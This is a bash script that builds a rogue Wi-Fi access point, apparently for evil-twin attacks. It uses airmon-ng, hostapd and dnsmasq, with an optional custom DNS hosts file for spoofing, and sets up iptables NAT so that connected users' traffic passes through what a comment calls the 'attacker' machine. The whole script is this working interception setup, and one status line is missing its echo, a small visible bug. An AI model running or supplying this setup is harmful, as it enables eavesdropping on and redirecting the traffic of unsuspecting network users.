#!/bin/bash

#Release wlan interfaces from other processes
echo Killing the following processes...
airmon-ng check
echo Please restart them after stopping the script.
airmon-ng check kill

sleep 1

#Kill existing dnsmasq & hostapd leftovers
echo Killing old hostapd processes...
killall hostapd
Killing old dnsmasq processes...
killall dnsmasq

#Device to start network on
MONITOR_DEVICE=wlan1

#Interface via which users connected to our new network will access internet
#This is usually the interface via which attacker is accessing internet.
OUTPUT_DEVICE=wlan0

#To exit properly on Ctrl+C
trap ctrl_c INT
function ctrl_c(){
	echo
	echo
	echo STOPPING SCRIPT
	echo Killing processes..
	killall dnsmasq
	killall hostapd
	echo Restarting NetworkManager	
	service network-manager restart
	echo Restarting wpa_supplicant
	service wpa_supplicant restart
	
}

#Start device and setup Gateway
ifconfig $MONITOR_DEVICE 10.0.0.1/24 up

#Start DNS & DHCP
#dnsmasq -C dnsmasq.conf -H dns_entries  (to specify a separate hosts file)
dnsmasq -C dnsmasq.conf

#Enable IPv4 Forwarding
sysctl -w net.ipv4.ip_forward=1

#Set up Iptables rules to allow connection via OUTPUT_DEVICE interface
iptables -P FORWARD ACCEPT
iptables --table nat -A POSTROUTING -o $OUTPUT_DEVICE -j MASQUERADE

#Start hotspot
hostapd ./hostapd.conf
